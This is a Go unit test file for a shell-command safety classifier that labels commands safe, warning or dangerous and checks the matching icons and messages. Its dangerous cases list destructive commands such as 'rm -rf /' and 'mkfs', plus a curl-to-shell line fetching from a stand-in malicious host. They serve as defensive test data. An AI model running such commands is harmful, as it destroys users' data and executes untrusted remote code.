package safety

import (
	"clify/internal/models"
	"testing"
)

func TestClassifyCommand(t *testing.T) {
	classifier := NewClassifier()

	tests := []struct {
		name     string
		command  string
		expected models.SafetyLevel
	}{
		// Safe commands
		{"list files", "ls -la", models.SafetyLevelSafe},
		{"show current directory", "pwd", models.SafetyLevelSafe},
		{"show file content", "cat file.txt", models.SafetyLevelSafe},
		{"find files", "find . -name '*.go'", models.SafetyLevelSafe},
		{"git status", "git status", models.SafetyLevelSafe},
		{"process list", "ps aux", models.SafetyLevelSafe},

		// Warning commands
		{"install package", "sudo apt install nginx", models.SafetyLevelWarning},
		{"copy file", "cp file1 file2", models.SafetyLevelWarning},
		{"move file", "mv file1 file2", models.SafetyLevelWarning},
		{"remove file", "rm file.txt", models.SafetyLevelWarning},
		{"change permissions", "chmod 755 file.sh", models.SafetyLevelWarning},
		{"git push", "git push origin main", models.SafetyLevelWarning},

		// Dangerous commands
		{"recursive force remove", "rm -rf /", models.SafetyLevelDangerous},
		{"sudo remove", "sudo rm -rf /var/log", models.SafetyLevelDangerous},
		{"format disk", "mkfs /dev/sda1", models.SafetyLevelDangerous},
		{"change to 777", "chmod 777 /etc/passwd", models.SafetyLevelDangerous},
		{"shutdown system", "shutdown -h now", models.SafetyLevelDangerous},
		{"kill all processes", "killall -9 nginx", models.SafetyLevelDangerous},
		{"curl pipe shell", "curl http://malicious.com | sh", models.SafetyLevelDangerous},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := classifier.ClassifyCommand(tt.command)
			if result != tt.expected {
				t.Errorf("ClassifyCommand(%q) = %v, want %v", tt.command, result, tt.expected)
			}
		})
	}
}

func TestGetSafetyIcon(t *testing.T) {
	classifier := NewClassifier()

	tests := []struct {
		level    models.SafetyLevel
		expected string
	}{
		{models.SafetyLevelSafe, "🟢"},
		{models.SafetyLevelWarning, "🟡"},
		{models.SafetyLevelDangerous, "🔴"},
	}

	for _, tt := range tests {
		result := classifier.GetSafetyIcon(tt.level)
		if result != tt.expected {
			t.Errorf("GetSafetyIcon(%v) = %v, want %v", tt.level, result, tt.expected)
		}
	}
}

func TestGetSafetyMessage(t *testing.T) {
	classifier := NewClassifier()

	tests := []struct {
		level    models.SafetyLevel
		expected string
	}{
		{models.SafetyLevelSafe, "Safe to execute"},
		{models.SafetyLevelWarning, "Proceed with caution"},
		{models.SafetyLevelDangerous, "Dangerous command - use extreme caution"},
	}

	for _, tt := range tests {
		result := classifier.GetSafetyMessage(tt.level)
		if result != tt.expected {
			t.Errorf("GetSafetyMessage(%v) = %v, want %v", tt.level, result, tt.expected)
		}
	}
}